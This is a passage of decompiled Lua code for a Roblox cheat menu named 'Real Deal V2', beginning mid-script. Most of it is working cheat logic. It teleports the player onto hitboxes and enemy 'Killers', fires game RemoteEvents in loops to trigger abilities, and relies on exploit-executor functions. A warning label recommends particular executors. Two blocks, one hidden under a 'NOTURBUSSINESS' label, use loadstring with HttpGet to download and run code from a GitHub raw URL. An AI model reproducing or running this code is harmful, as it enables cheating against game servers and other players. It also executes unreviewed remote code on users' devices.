			script.Parent.Image = "rbxassetid://134295878119246"
			script.Parent.Parent.Parent:WaitForChild("Vee Thingy"):SetAttribute("SigmaMode",false)
		end
	end)
end;
task.spawn(C_fa);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.VeeThingySelector.Skilled Sigma Mode {67?}.LocalScript
local function C_ff()
local script = G2L["ff"];
	script.Parent.MouseButton1Down:Connect(function()
		for i,v in pairs(script.Parent.Parent:GetChildren()) do
			if v:IsA("ImageButton") then
				v:SetAttribute("Checked", false)
				v.Image = "rbxassetid://72082883979213"
			end
			script.Parent:SetAttribute("Checked", true)
			script.Parent.Image = "rbxassetid://134295878119246"
			script.Parent.Parent.Parent:WaitForChild("Vee Thingy"):SetAttribute("SigmaMode", true)
		end
	end)
end;
task.spawn(C_ff);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.Extra.Vee Thingy.ImageButton.LocalScript
local function C_105()
local script = G2L["105"];
	local UIS = game:GetService("UserInputService")
	local Players = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	
	local plr = Players.LocalPlayer
	local char = plr.Character or plr.CharacterAdded:Wait()
	local CFRAME = char:WaitForChild("HumanoidRootPart")
	
	local coOBI, coSIGMA
	local Start = false
	local CurrentMode = nil -- "OBI" or "SIGMA"
	
	local button = script.Parent.Parent:WaitForChild("ImageButton")
	
	local function obistart()
		while Start and CurrentMode == "OBI" do
			task.wait(0.3)
			CFRAME.CFrame = workspace:WaitForChild("Map"):WaitForChild("Ingame")
				:WaitForChild(plr.Name .. "Spray"):WaitForChild("Hitbox").CFrame
	
			local args = {
				[1] = plr.Name .. "SkateTrick",
				[2] = {}
			}
			ReplicatedStorage.Modules.Network.RemoteEvent:FireServer(unpack(args))
		end
	end
	
	local function SIGMAstart()
		while Start and CurrentMode == "SIGMA" do
			task.wait(0.3)
	
			local args = {
				[1] = plr.Name .. "SkateTrick",
				[2] = {}
			}
			ReplicatedStorage.Modules.Network.RemoteEvent:FireServer(unpack(args))
		end
	end
	
	-- safely stop whichever mode is active
	local function stopAll()
		Start = false
		if coOBI and coroutine.status(coOBI) ~= "dead" then
			coroutine.close(coOBI)
		end
		if coSIGMA and coroutine.status(coSIGMA) ~= "dead" then
			coroutine.close(coSIGMA)
		end
		CurrentMode = nil
	end
	
	button:SetAttribute("toggle", false)
	button.Image = "http://www.roblox.com/asset/?id=76864339841735"
	
	button.MouseButton1Click:Connect(function()
		local newState = not button:GetAttribute("toggle")
		button:SetAttribute("toggle", newState)
		button.Image = newState and "http://www.roblox.com/asset/?id=75082622496228"
			or "http://www.roblox.com/asset/?id=76864339841735"
	
		if newState then
			stopAll() -- make sure nothing else is running before starting
			Start = true
	
			CFRAME.CFrame = workspace:WaitForChild("Map"):WaitForChild("Ingame")
				:WaitForChild(plr.Name .. "Spray"):WaitForChild("Hitbox").CFrame
	
			task.wait(0.5)
			ReplicatedStorage.Modules.Network.RemoteEvent:FireServer("UseActorAbility", {
				buffer.fromstring("\"Sk8\"")
			})
	
			if button.Parent:GetAttribute("SigmaMode") then
				CurrentMode = "SIGMA"
				coSIGMA = coroutine.create(SIGMAstart)
				coroutine.resume(coSIGMA)
			else
				CurrentMode = "OBI"
				coOBI = coroutine.create(obistart)
				coroutine.resume(coOBI)
			end
		else
			stopAll()
		end
	end)
	
end;
task.spawn(C_105);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.LocalScript
local function C_108()
local script = G2L["108"];
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	local parent = script.Parent
	
	--// UI references
	local PlayerIcon = parent:WaitForChild("PlrIcon")
	local PlayerName = PlayerIcon:WaitForChild("TextLabel")
	
	local ServerInfo = parent:WaitForChild("Server Info")
	local ServerAge = ServerInfo:WaitForChild("ServerAge"):WaitForChild("TextLabel")
	local DateLabel = ServerInfo:WaitForChild("Date"):WaitForChild("Date")
	local LocalTimeLabel = ServerInfo:WaitForChild("LocalTime"):WaitForChild("LocalTime")
	
	--// Set player name and actual Roblox avatar icon
	PlayerName.Text = player.Name
	
	local thumb, _ = Players:GetUserThumbnailAsync(
		player.UserId,
		Enum.ThumbnailType.HeadShot,
		Enum.ThumbnailSize.Size420x420
	)
	PlayerIcon.Image = thumb
	
	--// Start tracking server age
	local startTime = tick()
	
	--// Update server info every second
	task.spawn(function()
		while task.wait(1) do
			-- Server age (hh:mm:ss)
			local elapsed = math.floor(tick() - startTime)
			local hours = math.floor(elapsed / 3600)
			local minutes = math.floor((elapsed % 3600) / 60)
			local seconds = elapsed % 60
			ServerAge.Text = string.format("%02d:%02d:%02d", hours, minutes, seconds)
	
			-- Date (dd/mm/yyyy)
			local currentTime = os.date("*t")
			DateLabel.Text = string.format("%02d/%02d/%04d", currentTime.day, currentTime.month, currentTime.year)
	
			-- Local time (hh:mm:ss)
			LocalTimeLabel.Text = string.format("%02d:%02d:%02d", currentTime.hour, currentTime.min, currentTime.sec)
		end
	end)
	
end;
task.spawn(C_108);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.About.Frame.TextLabel.TextButton.LocalScript
local function C_127()
local script = G2L["127"];
	local DEFAULT_R, DEFAULT_G, DEFAULT_B = 27, 137, 147
	
	local button = script.Parent
	local parent = button.Parent
	local canvasGroup = button.Parent.Parent.Parent.Parent.Parent.Parent:WaitForChild("CanvasGroup")
	local tabs = button.Parent.Parent.Parent.Parent.Parent:WaitForChild("THETABS")
	
	button.MouseButton1Down:Connect(function()
		-- Get text values
		local Rtext = parent:WaitForChild("Red"):WaitForChild("TextBox").Text
		local Gtext = parent:WaitForChild("Green"):WaitForChild("TextBox").Text
		local Btext = parent:WaitForChild("Blue"):WaitForChild("TextBox").Text
	
		-- Convert safely
		local R = tonumber(Rtext)
		local G = tonumber(Gtext)
		local B = tonumber(Btext)
	
		-- If any is invalid, reset all
		if not R or not G or not B then
			R, G, B = DEFAULT_R, DEFAULT_G, DEFAULT_B
			parent.Red.TextBox.Text = tostring(DEFAULT_R)
			parent.Green.TextBox.Text = tostring(DEFAULT_G)
			parent.Blue.TextBox.Text = tostring(DEFAULT_B)
		end
	
		-- Add modifiers
		local Rsquared = math.clamp(R + 4, 0, 255)
		local Gsquared = math.clamp(G + 21, 0, 255)
		local Bsquared = math.clamp(B + 25, 0, 255)
	
		-- Apply colors
		canvasGroup.BackgroundColor3 = Color3.fromRGB(Rsquared, Gsquared, Bsquared)
		for _, v in pairs(tabs:GetChildren()) do
			if v:IsA("GuiObject") then
				v.BackgroundColor3 = Color3.fromRGB(R, G, B)
			end
		end
	end)
	
end;
task.spawn(C_127);
-- StarterGui.Real Deal V2.Main.CanvasGroup.THETABS.STOPSKIDDIN.TextLabel.TextButton.LocalScript
local function C_13a()
local script = G2L["13a"];
	function missing(t, f, fallback)
		if type(f) == t then return f end
		return fallback
	end
	local StarterGui = game:GetService("StarterGui")
	
	everyClipboard = missing("function", setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set))
	function toClipboard(txt)
		if everyClipboard then
			everyClipboard(tostring(txt))
			StarterGui:SetCore("SendNotification", {
				Title = "Copied",
				Text =  txt .. " to clipboard!",
				Duration = 3, -- seconds
			})
		else
			StarterGui:SetCore("SendNotification", {
				Title = "Notifier",
				Text = "Your Exploit Dosent Allow You To Copy Text So If You Want Copy The Script Manually " .. script.Parent:GetAttribute("DONTCHANGE"),
				Duration = 3, -- seconds
			})
		end
	end
	script.Parent.MouseButton1Down:Connect(function()
		toClipboard(script.Parent:GetAttribute("DONTCHANGE"))
	end)
end;
task.spawn(C_13a);
-- StarterGui.Real Deal V2.Main.StunBtn.LocalScript
local function C_141()
local script = G2L["141"];
	local a = workspace:WaitForChild("Players"):WaitForChild("Killers"):GetChildren()
	local name = nil
	local player = game.Players.LocalPlayer
	
	local charector = player.Character or player.CharacterAdded:Wait()
	local hrp = charector:WaitForChild("HumanoidRootPart")
	local part = Instance.new("Part")
	local button = script.Parent.Parent:WaitForChild("StunBtn")
	
	button.MouseButton1Down:Connect(function()
	_G.m = 0
	
	task.spawn(function()
		while _G.m < 10 do
			_G.m = _G.m+1
			workspace:WaitForChild("BTCH"):Destroy()
		end
	end)
	
	local pos = hrp.Position
	local FOLDER = Instance.new("Folder")
	FOLDER.Name = "BTCH"
	FOLDER.Parent = workspace
	
	local xPos = hrp.Position.X
	local yPos = hrp.Position.Y
	local zPos = hrp.Position.Z
	
	local xDir = hrp.Rotation.X
	local yDir = hrp.Rotation.Y
	local zDir = hrp.Rotation.Z
	
	
	part.Position = Vector3.new(xPos,yPos,zPos)
	part.Rotation = Vector3.new(xDir,yDir,zDir)
	part.Anchored = true
	part.Parent = workspace.BTCH
	part.CanCollide = false
	part.Transparency = 1
	
	for i, v in ipairs(a) do
		name = v.name
	end
	
	if name ~= nil then
	
		game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("Network"):WaitForChild("RemoteEvent"):FireServer("UseActorAbility", { "Slash"})
		game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("Network"):WaitForChild("RemoteEvent"):FireServer("UseActorAbility", { "Punch"})
		game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("Network"):WaitForChild("RemoteEvent"):FireServer("UseActorAbility", { "Shoot"})
		task.wait(0.4)
		_G.you = 0
		task.spawn(function()
			task.wait(0.00003)
			game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("Network"):WaitForChild("RemoteEvent"):FireServer("UseActorAbility", { "Dagger"})
		end)
		while _G.you < 10 do
			_G.you = _G.you+1
			task.wait(0.01)
			hrp.CFrame = workspace:WaitForChild("Players"):WaitForChild("Killers"):WaitForChild(name):WaitForChild("HumanoidRootPart").CFrame
		end
	end
	task.wait(0.65)
	
	hrp.CFrame = part.CFrame
	FOLDER:Destroy()
	end)
end;
task.spawn(C_141);
-- StarterGui.Real Deal V2.Main.Open.LocalScript
local function C_146()
local script = G2L["146"];
	local open = script.Parent.Parent:WaitForChild("Open")
	
	open.MouseButton1Up:Connect(function()
		open.Visible = false
		open.Parent:WaitForChild("CanvasGroup").Visible = true
	end)
	
	local UIS = game:GetService("UserInputService")
	local frame = script.Parent
	
	local dragging
	local dragStart
	local startPos
	
	-- When you start dragging
	frame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			dragStart = input.Position
			startPos = frame.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	-- Track mouse movement globally (not just inside the frame)
	UIS.InputChanged:Connect(function(input)
		if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
			local delta = input.Position - dragStart
			frame.Position = UDim2.new(
				startPos.X.Scale,
				startPos.X.Offset + delta.X,
				startPos.Y.Scale,
				startPos.Y.Offset + delta.Y
			)
		end
	end)
	
end;
task.spawn(C_146);
-- StarterGui.Real Deal V2.Main.HAKARIBUTTON.LocalScript
local function C_14b()
local script = G2L["14b"];
	local button = script.Parent
	local player = game.Players.LocalPlayer
	local animationId = "rbxassetid://138019937280193"
	
	-- Global toggle (so other scripts can check)
	_G.k = _G.k or false
	
	-- Function to play the animation
	local function playAnim(character)
		local humanoid = character:WaitForChild("Humanoid")
		local animator = humanoid:FindFirstChildOfClass("Animator")
		if not animator then
			animator = Instance.new("Animator")
			animator.Parent = humanoid
		end
	
		local animation = Instance.new("Animation")
		animation.AnimationId = animationId
		local track = animator:LoadAnimation(animation)
		return track
	end
	
	-- Handle button click
	button.MouseButton1Down:Connect(function()
		_G.k = not _G.k
	
		if _G.k then
			-- Play the animation
			local track = playAnim(player.Character)
			if track then
				track:Play()
			end
	
			-- Reapply if respawned
			player.CharacterAdded:Connect(function(char)
				local newTrack = playAnim(char)
				if newTrack then newTrack:Play() end
			end)
		else
			-- Stop the animation if playing
			for _, anim in pairs(player.Character.Humanoid:GetPlayingAnimationTracks()) do
				if anim.Animation.AnimationId == animationId then
					anim:Stop()
				end
			end
		end
	end)
	
end;
task.spawn(C_14b);
-- StarterGui.Real Deal V2.Main.Warning.LocalScript
local function C_150()
local script = G2L["150"];
	script.Parent.Visible = false
end;
task.spawn(C_150);
-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.TextBox.TextButton.LocalScript
local function C_15c()
local script = G2L["15c"];
	local keybinds = {
		"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q",
		"R","S","T","U","V","W","X","Y","Z"
	}
	
	local parent = script.Parent.Parent.Parent
	local confirm = parent:WaitForChild("Confirm")
	local textBox = parent:WaitForChild("TextBox")
	
	confirm.Visible = false
	textBox.Text = "ENTER THE KEYBIND DEFAULT IS 'Z'"
	textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
	textBox:SetAttribute("canchange", true)
	textBox:SetAttribute("value", "Z")
	
	script.Parent.Parent:WaitForChild("TextButton").MouseButton1Down:Connect(function()
		local input = textBox.Text
		if input ~= "SecretButton" then
			input = string.upper(textBox.Text)
		end
	
		if input == "" or input == "ENTER THE KEYBIND DEFAULT IS 'Z'" then
			-- default to Z
			textBox:SetAttribute("value", "Z")
			confirm.Visible = true
			confirm.TextLabel.Text = "Confirm Setting Keybind To :- Z"
			return
		elseif input == "SecretButton" then
			confirm.Visible = true
			confirm.TextLabel.Text = "Confirm Mobile Button? and set keybind to :- Z"
			return
		end
		
	
		if table.find(keybinds, input) then
			textBox:SetAttribute("value", input)
			confirm.Visible = true
			confirm.TextLabel.Text = "Confirm Setting Keybind To :- " .. input
		else
			confirm.Visible = false
			textBox.Text = "INVALID KEYBIND"
			textBox.TextColor3 = Color3.fromRGB(255, 6, 10)
			task.wait(1.25)
			textBox.Text = "ENTER THE KEYBIND DEFAULT IS 'Z'"
			textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
		end
	end)
	
end;
task.spawn(C_15c);
-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.Confirm.LocalScript
local function C_162()
local script = G2L["162"];
	script.Parent.Parent.Parent:WaitForChild("KeybindThingyForHAKARI").Visible = false
	script.Parent.Parent.Parent:WaitForChild("HAKARIBUTTON").Visible = false
end;
task.spawn(C_162);
-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.Confirm.Yes.LocalScript
local function C_165()
local script = G2L["165"];
	script.Parent.Parent:WaitForChild("Yes").MouseButton1Down:Connect(function()
		if script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForHAKARI"):WaitForChild("TextBox").Text ~= "SecretButton" then
			script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForHAKARI"):WaitForChild("TextBox"):SetAttribute("value", "Z")
		script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForHAKARI").Visible = false
		script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForHAKARI"):WaitForChild("Confirm").Visible = false
		script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForHAKARI"):WaitForChild("TextBox").Text = "ENTER THE KEYBIND DEFAULT IS 'Z'"
		script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForHAKARI"):WaitForChild("TextBox").TextColor3 = Color3.fromRGB(255, 255, 255)
		else
			script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForHAKARI").Visible = false
			script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForHAKARI"):WaitForChild("Confirm").Visible = false
			script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForHAKARI"):WaitForChild("TextBox").Text = "ENTER THE KEYBIND DEFAULT IS 'Z'"
			script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForHAKARI"):WaitForChild("TextBox").TextColor3 = Color3.fromRGB(255, 255, 255)
			script.Parent.Parent.Parent.Parent:WaitForChild("HAKARIBUTTON").Visible = true
		end
	end)
end;
task.spawn(C_165);
-- StarterGui.Real Deal V2.Main.KeybindThingyForHAKARI.Confirm.No.LocalScript
local function C_168()
local script = G2L["168"];
	script.Parent.Parent:WaitForChild("No").MouseButton1Down:Connect(function()
		script.Parent.Parent.Parent:WaitForChild("Confirm").Visible = false
		script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForHAKARI"):WaitForChild("TextBox").Text = "ENTER THE KEYBIND DEFAULT IS 'Z'"		
		script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForHAKARI"):WaitForChild("TextBox").TextColor3 = Color3.fromRGB(255, 255, 255)
		script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForHAKARI"):WaitForChild("TextBox"):SetAttribute("value", "")	
	end)
end;
task.spawn(C_168);
-- StarterGui.Real Deal V2.Main.KeybindThingy.TextBox.TextButton.LocalScript
local function C_178()
local script = G2L["178"];
	local keybinds = {
		"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q",
		"R","S","T","U","V","W","X","Y","Z"
	}
	
	local parent = script.Parent.Parent.Parent
	local confirm = parent:WaitForChild("Confirm")
	local textBox = parent:WaitForChild("TextBox")
	
	confirm.Visible = false
	textBox.Text = "ENTER THE KEYBIND DEFAULT IS 'Z'"
	textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
	textBox:SetAttribute("canchange", true)
	textBox:SetAttribute("value", "Z")
	
	script.Parent.Parent:WaitForChild("TextButton").MouseButton1Down:Connect(function()
		local input = textBox.Text
		if input ~= "SecretButton" then
			input = string.upper(textBox.Text)
		end
	
		if input == "" or input == "ENTER THE KEYBIND DEFAULT IS 'Z'" then
			-- default to Z
			textBox:SetAttribute("value", "Z")
			confirm.Visible = true
			confirm.TextLabel.Text = "Confirm Setting Keybind To :- Z"
			return
		elseif input == "SecretButton" then
			confirm.Visible = true
			confirm.TextLabel.Text = "Confirm Mobile Button? and set keybind to :- Z"
			return
		end
		
	
		if table.find(keybinds, input) then
			textBox:SetAttribute("value", input)
			confirm.Visible = true
			confirm.TextLabel.Text = "Confirm Setting Keybind To :- " .. input
		else
			confirm.Visible = false
			textBox.Text = "INVALID KEYBIND"
			textBox.TextColor3 = Color3.fromRGB(255, 6, 10)
			task.wait(1.25)
			textBox.Text = "ENTER THE KEYBIND DEFAULT IS 'Z'"
			textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
		end
	end)
	
end;
task.spawn(C_178);
-- StarterGui.Real Deal V2.Main.KeybindThingy.Confirm.LocalScript
local function C_17e()
local script = G2L["17e"];
	script.Parent.Parent.Parent:WaitForChild("KeybindThingy").Visible = false
	script.Parent.Parent.Parent:WaitForChild("StunBtn").Visible = false
end;
task.spawn(C_17e);
-- StarterGui.Real Deal V2.Main.KeybindThingy.Confirm.Yes.LocalScript
local function C_181()
local script = G2L["181"];
	script.Parent.Parent:WaitForChild("Yes").MouseButton1Down:Connect(function()
		if script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingy"):WaitForChild("TextBox").Text ~= "SecretButton" then
			script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingy"):WaitForChild("TextBox"):SetAttribute("value", "Z")
		script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingy").Visible = false
		script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingy"):WaitForChild("Confirm").Visible = false
		script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingy"):WaitForChild("TextBox").Text = "ENTER THE KEYBIND DEFAULT IS 'Z'"
		script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingy"):WaitForChild("TextBox").TextColor3 = Color3.fromRGB(255, 255, 255)
		else
			script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingy").Visible = false
			script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingy"):WaitForChild("Confirm").Visible = false
			script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingy"):WaitForChild("TextBox").Text = "ENTER THE KEYBIND DEFAULT IS 'Z'"
			script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingy"):WaitForChild("TextBox").TextColor3 = Color3.fromRGB(255, 255, 255)
			script.Parent.Parent.Parent.Parent:WaitForChild("StunBtn").Visible = true
		end
	end)
end;
task.spawn(C_181);
-- StarterGui.Real Deal V2.Main.KeybindThingy.Confirm.No.LocalScript
local function C_184()
local script = G2L["184"];
	script.Parent.Parent:WaitForChild("No").MouseButton1Down:Connect(function()
		script.Parent.Parent.Parent:WaitForChild("Confirm").Visible = false
		script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingy"):WaitForChild("TextBox").Text = "ENTER THE KEYBIND DEFAULT IS 'Z'"		
		script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingy"):WaitForChild("TextBox").TextColor3 = Color3.fromRGB(255, 255, 255)
		script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingy"):WaitForChild("TextBox"):SetAttribute("value", "")	
	end)
end;
task.spawn(C_184);
-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.TextBox.TextButton.LocalScript
local function C_194()
local script = G2L["194"];
	local keybinds = {
		"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q",
		"R","S","T","U","V","W","X","Y","Z"
	}
	
	local parent = script.Parent.Parent.Parent
	local confirm = parent:WaitForChild("Confirm")
	local textBox = parent:WaitForChild("TextBox")
	
	confirm.Visible = false
	textBox.Text = "ENTER THE KEYBIND DEFAULT IS 'Z'"
	textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
	textBox:SetAttribute("canchange", true)
	textBox:SetAttribute("value", "Z")
	
	script.Parent.Parent:WaitForChild("TextButton").MouseButton1Down:Connect(function()
		local input = textBox.Text
		if input ~= "SecretButton" then
			input = string.upper(textBox.Text)
		end
	
		if input == "" or input == "ENTER THE KEYBIND DEFAULT IS 'Z'" then
			-- default to Z
			textBox:SetAttribute("value", "Z")
			confirm.Visible = true
			confirm.TextLabel.Text = "Confirm Setting Keybind To :- Z"
			return
		elseif input == "SecretButton" then
			confirm.Visible = true
			confirm.TextLabel.Text = "Confirm Mobile Button? and set keybind to :- Z"
			return
		end
		
	
		if table.find(keybinds, input) then
			textBox:SetAttribute("value", input)
			confirm.Visible = true
			confirm.TextLabel.Text = "Confirm Setting Keybind To :- " .. input
		else
			confirm.Visible = false
			textBox.Text = "INVALID KEYBIND"
			textBox.TextColor3 = Color3.fromRGB(255, 6, 10)
			task.wait(1.25)
			textBox.Text = "ENTER THE KEYBIND DEFAULT IS 'Z'"
			textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
		end
	end)
	
end;
task.spawn(C_194);
-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.Confirm.LocalScript
local function C_19a()
local script = G2L["19a"];
	script.Parent.Parent.Parent:WaitForChild("KeybindThingyForFAKEBLOCK").Visible = false
	script.Parent.Parent.Parent:WaitForChild("FakeBlockBTN").Visible = false
end;
task.spawn(C_19a);
-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.Confirm.Yes.LocalScript
local function C_19d()
local script = G2L["19d"];
	script.Parent.Parent:WaitForChild("Yes").MouseButton1Down:Connect(function()
		if script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForFAKEBLOCK"):WaitForChild("TextBox").Text ~= "SecretButton" then
			script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForFAKEBLOCK"):WaitForChild("TextBox"):SetAttribute("value", "Z")
		script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForFAKEBLOCK").Visible = false
		script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForFAKEBLOCK"):WaitForChild("Confirm").Visible = false
		script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForFAKEBLOCK"):WaitForChild("TextBox").Text = "ENTER THE KEYBIND DEFAULT IS 'Z'"
		script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForFAKEBLOCK"):WaitForChild("TextBox").TextColor3 = Color3.fromRGB(255, 255, 255)
		else
			script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForFAKEBLOCK").Visible = false
			script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForFAKEBLOCK"):WaitForChild("Confirm").Visible = false
			script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForFAKEBLOCK"):WaitForChild("TextBox").Text = "ENTER THE KEYBIND DEFAULT IS 'Z'"
			script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForFAKEBLOCK"):WaitForChild("TextBox").TextColor3 = Color3.fromRGB(255, 255, 255)
			script.Parent.Parent.Parent.Parent:WaitForChild("HAKARIBUTTON").Visible = true
		end
	end)
end;
task.spawn(C_19d);
-- StarterGui.Real Deal V2.Main.KeybindThingyForFAKEBLOCK.Confirm.No.LocalScript
local function C_1a0()
local script = G2L["1a0"];
	script.Parent.Parent:WaitForChild("No").MouseButton1Down:Connect(function()
		script.Parent.Parent.Parent:WaitForChild("Confirm").Visible = false
		script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForFAKEBLOCK"):WaitForChild("TextBox").Text = "ENTER THE KEYBIND DEFAULT IS 'Z'"		
		script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForFAKEBLOCK"):WaitForChild("TextBox").TextColor3 = Color3.fromRGB(255, 255, 255)
		script.Parent.Parent.Parent.Parent:WaitForChild("KeybindThingyForFAKEBLOCK"):WaitForChild("TextBox"):SetAttribute("value", "")	
	end)
end;
task.spawn(C_1a0);
-- StarterGui.Real Deal V2.Main.FakeBlockBTN.LocalScript
local function C_1a9()
local script = G2L["1a9"];
	local button = script.Parent
	local player = game.Players.LocalPlayer
	local animationId = script.Parent.Parent:WaitForChild("CanvasGroup"):WaitForChild("THETABS"):WaitForChild("Extra"):WaitForChild("Fake Block"):GetAttribute("Animation")
	
	-- Global toggle (so other scripts can check)
	_G.kL = _G.kL or false
	
	-- Function to play the animation
	local function playAnim(character)
		local humanoid = character:WaitForChild("Humanoid")
		local animator = humanoid:FindFirstChildOfClass("Animator")
		if not animator then
			animator = Instance.new("Animator")
			animator.Parent = humanoid
		end
	
		local animation = Instance.new("Animation")
		animation.AnimationId = animationId
		local track = animator:LoadAnimation(animation)
		return track
	end
	
	-- Handle button click
	button.MouseButton1Down:Connect(function()
		animationId = script.Parent.Parent:WaitForChild("CanvasGroup"):WaitForChild("THETABS"):WaitForChild("Extra"):WaitForChild("Fake Block"):GetAttribute("Animation")
	
			-- Play the animation
			local track = playAnim(player.Character)
			if track then
				track:Play()
			end
	
			-- Reapply if respawned
			player.CharacterAdded:Connect(function(char)
				local newTrack = playAnim(char)
				if newTrack then newTrack:Play() end
			end)
	end)
	
end;
task.spawn(C_1a9);
-- StarterGui.Real Deal V2.KeySystem.CanvasGroup.TextBox.TextButton.LocalScript
local function C_1b4()
local script = G2L["1b4"];
	
end;
task.spawn(C_1b4);
-- StarterGui.Real Deal V2.KeySystem.CanvasGroup.Close.LocalScript
local function C_1bc()
local script = G2L["1bc"];
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.Parent.Parent.Parent:Destroy()
	end)
end;
task.spawn(C_1bc);
-- StarterGui.Real Deal V2.Warning.TextButton.LocalScript
local function C_1c2()
local script = G2L["1c2"];
	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.Parent:Destroy()
	end)
end;
task.spawn(C_1c2);
-- StarterGui.Real Deal V2.Warning.TextLabel.LocalScript
local function C_1c6()
local script = G2L["1c6"];
	if game.Players.LocalPlayer.Name ~= "ThisMyLoginBlue" then
	script.Parent.Text = "You Are Using" .. identifyexecutor() .. " And Stamina Related Things Will Most Probably Not Work So It Is Advised To Use A Better Executor Such As Delta and KRNL For Mobile And Velocity Or LX63 For PC (Keyless) Or Visit https://voxlis.net"
	end
end;
task.spawn(C_1c6);
-- StarterGui.Real Deal V2.THESEIDOTS.NOTURBUSSINESS
local function C_1c8()
local script = G2L["1c8"];
	local yes = true
	while _G.STARTTHEMFING do
		if yes then
			yes = false
			loadstring(game:HttpGet("https://raw.githubusercontent.com/SeaKarate/bugsakenhacks/refs/heads/main/muhehehe"))();
		end
	end
end;
task.spawn(C_1c8);
-- StarterGui.Real Deal V2.THESEIDOTS.CanvasGroup.TextButton.LocalScript
local function C_1ce()
local script = G2L["1ce"];
	script.Parent.MouseButton1Down:Connect(function()
		game.Players.LocalPlayer:Kick("USE THE ORIGINAL SCRIPT AND SKIDDERS STOP SKIDDING")
	end)
end;
task.spawn(C_1ce);
-- StarterGui.Real Deal V2.UhmUhUhAdminMode?
local function C_1e2()
local script = G2L["1e2"];
	local TweenService = game:GetService("TweenService")
	
	local toggled = false
	
	local thebutton = script.Parent:WaitForChild("Main"):WaitForChild("CanvasGroup"):WaitForChild("ScrollingFrame"):WaitForChild("Admin Mode")
	if game.Players.LocalPlayer.Name == "ThisMyLoginBlue" then
		--KeySystem
		_G.PremiumMode = {
			"TEST",
			"TEST1"
		} 
	else
		loadstring(game:HttpGet("https://raw.githubusercontent.com/SeaKarate/bugsakenhacks/refs/heads/main/adminKeys"))()
	end
	
	local lowerkeys = {}
	for i,v in ipairs(_G.PremiumMode) do
		lowerkeys[i] = string.lower(v)
	end
	
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	
	local keySystem = script.Parent:WaitForChild("PremiumMode")
	local canvasGroup = keySystem:WaitForChild("CanvasGroup")
	local textBox = canvasGroup:WaitForChild("TextBox")
	local textButton = textBox:WaitForChild("TextButton")
	local gui = script.Parent:WaitForChild("Main"):WaitForChild("CanvasGroup"):WaitForChild("THETABS"):WaitForChild("Admin")
	local close = keySystem:WaitForChild("CanvasGroup"):WaitForChild("Close")
	
	gui.Parent = nil
	
	thebutton.MouseButton1Down:Connect(function()
		if script:GetAttribute("what") == false then
		toggled = not(toggled)
		canvasGroup.Visible = toggled
		textBox.Text = ""
		end
